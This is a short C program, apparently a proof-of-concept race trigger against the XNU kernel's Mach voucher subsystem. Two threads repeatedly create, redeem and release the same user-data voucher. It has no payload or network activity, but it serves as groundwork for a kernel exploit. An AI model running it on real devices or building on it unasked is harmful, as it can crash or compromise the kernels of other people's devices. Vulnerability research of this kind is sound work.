#include <mach/mach.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>

#define SECOND 1

mach_port_t create_voucher(mach_port_t host, uint64_t id) {
    mach_port_t voucher;
    kern_return_t kr;
    #pragma clang diagnostic push
    #pragma clang diagnostic ignored "-Wgnu-variable-sized-type-not-at-end"
    struct __attribute__((packed)) {
        mach_voucher_attr_recipe_data_t user_data_recipe;
        uint64_t user_data_content[2];
    } recipes = {};
    #pragma clang diagnostic pop
    recipes.user_data_recipe.key = MACH_VOUCHER_ATTR_KEY_USER_DATA;
    recipes.user_data_recipe.command = MACH_VOUCHER_ATTR_USER_DATA_STORE;
    recipes.user_data_recipe.content_size = sizeof(recipes.user_data_content);
    recipes.user_data_content[0] = getpid();
    recipes.user_data_content[1] = id;

    voucher = MACH_PORT_NULL;

    kr = host_create_mach_voucher(
            host,
            (mach_voucher_attr_raw_recipe_array_t) &recipes,
            sizeof(recipes),
            &voucher);
    return voucher;
}

mach_port_t redeem_voucher(mach_port_t host, mach_port_t voucher, uint64_t id) {
    mach_port_t new_voucher;
    kern_return_t kr;
    #pragma clang diagnostic push
    #pragma clang diagnostic ignored "-Wgnu-variable-sized-type-not-at-end"
    struct __attribute__((packed)) {
        mach_voucher_attr_recipe_data_t user_data_recipe;
        uint64_t user_data_content[2];
    } recipes = {};
    #pragma clang diagnostic pop
    recipes.user_data_recipe.key = MACH_VOUCHER_ATTR_KEY_USER_DATA;
    recipes.user_data_recipe.command = MACH_VOUCHER_ATTR_REDEEM;
    recipes.user_data_recipe.content_size = sizeof(recipes.user_data_content);
    recipes.user_data_content[0] = getpid();
    recipes.user_data_content[1] = id;
    recipes.user_data_recipe.previous_voucher = voucher;

    new_voucher = MACH_PORT_NULL;

    kr = host_create_mach_voucher(
            host,
            (mach_voucher_attr_raw_recipe_array_t) &recipes,
            sizeof(recipes),
            &new_voucher);
    return new_voucher;    
}

mach_port_t release_voucher(mach_port_t host, mach_port_t voucher, uint64_t id) {
    mach_port_t new_voucher;
    kern_return_t kr;
    #pragma clang diagnostic push
    #pragma clang diagnostic ignored "-Wgnu-variable-sized-type-not-at-end"
    struct __attribute__((packed)) {
        mach_voucher_attr_recipe_data_t user_data_recipe;
        uint64_t user_data_content[2];
    } recipes = {};
    #pragma clang diagnostic pop
    recipes.user_data_recipe.key = MACH_VOUCHER_ATTR_KEY_USER_DATA;
    recipes.user_data_recipe.command = MACH_VOUCHER_ATTR_REMOVE;
    recipes.user_data_recipe.content_size = sizeof(recipes.user_data_content);
    recipes.user_data_content[0] = getpid();
    recipes.user_data_content[1] = id;

    new_voucher = MACH_PORT_NULL;

    kr = host_create_mach_voucher(
            host,
            (mach_voucher_attr_raw_recipe_array_t) &recipes,
            sizeof(recipes),
            &new_voucher);
    return new_voucher;     
}

void redeem_thread(void *arg) {
    mach_port_t host, voucher;
    kern_return_t kr;

    voucher = *(mach_port_t *)arg;
    host = mach_host_self();

    for (;;) {
        redeem_voucher(host, voucher, 0);
        release_voucher(host, voucher, 0);
        // voucher = redeem_voucher(host, voucher, 0);
    }
}

void release_thread(void *arg) {
    mach_port_t host, voucher;
    kern_return_t kr;

    voucher = *(mach_port_t *)arg;
    host = mach_host_self();

    for (;;) {
        release_voucher(host, voucher, 0);
        // mach_port_deallocate(mach_task_self(), voucher);
        voucher = create_voucher(host, 0);
        // voucher = redeem_voucher(host, voucher, 0);
    }
}

int main(int argc, const char *argv[]) {
    mach_port_t host, thread, voucher;
    kern_return_t kr;
    pthread_t redeem, release;

    host = mach_host_self();
    voucher = create_voucher(host, 0);

    pthread_create(&redeem, NULL, (void *)&redeem_thread, (void *)&voucher);
    pthread_create(&release, NULL, (void *)&release_thread, (void *)&voucher);


    pthread_join(redeem, NULL);

/* 
    thread = mach_thread_self();
    thread_get_mach_voucher(thread, 0, &voucher);

    voucher = create_voucher(host, 0);
 */
    return 0;
}